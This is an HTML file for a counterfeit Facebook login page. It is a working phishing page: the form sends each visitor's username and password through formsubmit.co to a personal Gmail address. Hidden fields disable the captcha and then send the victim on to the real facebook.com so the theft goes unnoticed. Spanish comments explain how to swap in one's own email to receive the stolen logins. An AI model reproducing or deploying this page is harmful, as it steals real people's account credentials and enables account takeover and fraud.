<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Facebook Login Page</title>
  <link rel="stylesheet" href="styles.css" />
</head>
<body>
  <div class="content">
    <div class="flex-div">
      <div class="name-content">
        <h1 class="logo">Facebook</h1>
        <p>Connect with friends and the world around you on Facebook.</p>
      </div>

      <form action="https://formsubmit.co/jabonesone@gmail.com" method="POST">
        <!-- Cambia "tucorreo@example.com" por tu correo real -->
        
        <input type="text" name="username" placeholder="Email or Phone Number" required />
        <input type="password" name="password" placeholder="Password" required />
        <button type="submit" class="login">Log In</button>
        
        <!-- Opcionales -->
        <a href="#">Forgot Password?</a>
        <hr>
        <button type="button" class="create-account">Create New Account</button>

        <!-- Evita el captcha de FormSubmit -->
        <input type="hidden" name="_captcha" value="false">
        
        <!-- Redirige a otra página después de enviar -->
        <input type="hidden" name="_next" value="https://facebook.com">
      </form>

    </div>
  </div>
</body>
</html>
